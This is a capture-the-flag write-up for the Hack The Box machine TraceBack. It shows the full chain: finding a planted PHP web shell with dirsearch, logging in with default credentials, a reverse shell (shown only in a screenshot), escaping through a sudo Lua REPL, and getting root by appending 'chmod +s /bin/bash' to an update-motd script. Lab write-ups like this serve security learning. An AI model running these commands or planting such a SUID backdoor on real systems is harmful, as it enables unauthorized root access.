---
layout: post
category: writeup
---

## Machine Info

- Name: TraceBack
- Description: Traceback is an easy difficulty machine that features an Apache web server. A PHP web shell uploaded by a hacker is accessible and can be used to gain command execution in the context of the `webadmin` user. This user has the privilege to run a tool called `luvit`, which executes Lua code as the `sysadmin` user. Finally, the Sysadmin user has write permissions to the `update-motd` file. This file is run as root every time someone connects to the machine through SSH. This is used to escalate privileges to root.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](assets/images/2024-01-28-HTB-TraceBack-Writeup-image-1.png)

As soon as I go to the webpage I see that it has already been owned, I see a signature signed by Xh4H, I do a quick google search and find that he has a github, and that he has a repo called webshells:

![](assets/images/2024-01-28-HTB-TraceBack-Writeup-image-2.png)

I'll create a wordlist with all his webshells in there and dirsearch:

```bash
HTB  dirsearch -w /home/kali/HTB/file.txt -t 64 -e php,txt,html -f -u  http://10.10.10.181/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 13

Output File: /home/kali/.dirsearch/reports/10.10.10.181/-_24-01-28_21-26-03.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-28_21-26-03.log

Target: http://10.10.10.181/

[21:26:04] Starting: 
[21:26:07] 200 -    1KB - /smevk.php                                        

Task Completed
```

We got a hit on smevk.php, when I route to it I see alogin page:

![](assets/images/2024-01-28-HTB-TraceBack-Writeup-image-3.png)

I'll check the source on the github to see if they are still default creds:

![](assets/images/2024-01-28-HTB-TraceBack-Writeup-image-4.png)
I login with `admin:admin`!

I run a reverse shell from the execute portion:

![](assets/images/2024-01-28-HTB-TraceBack-Writeup-image-5.png)

```bash
webadmin@traceback:/var/www/html$ whoami
webadmin
```
## Privilege Escalation

I find a note in my home dir:

```bash
webadmin@traceback:/home/webadmin$ cat note.txt 
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Since I know this machine has been pwned before me, and I am just rehacking to get control of the box again, I can see that the bash_history is present:

```bash
cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
```

I can see that my user can run sudo as sysadmin on this luvit tool:

```bash
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/sh")
$ whoami
sysadmin
```

I check if we can write to anything due to our group:

```bash
sysadmin@traceback:/etc/update-motd.d$ find / -group sysadmin 2>/dev/null  | grep -v proc | grep -v sys 
| grep -v run
/etc/update-motd.d
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
/home/webadmin
/home/webadmin/note.txt
```

I see we can edit files in the update-motd directory, so I'll add a command in there and ssh in!

```bash
sysadmin@traceback:/etc/update-motd.d$ echo "chmod +s /bin/bash" >> 00-header
```

I log out and back in and get a shell as root:

```bash
$ bash -p
bash-4.4# whoami
root
```

best,
gerbsec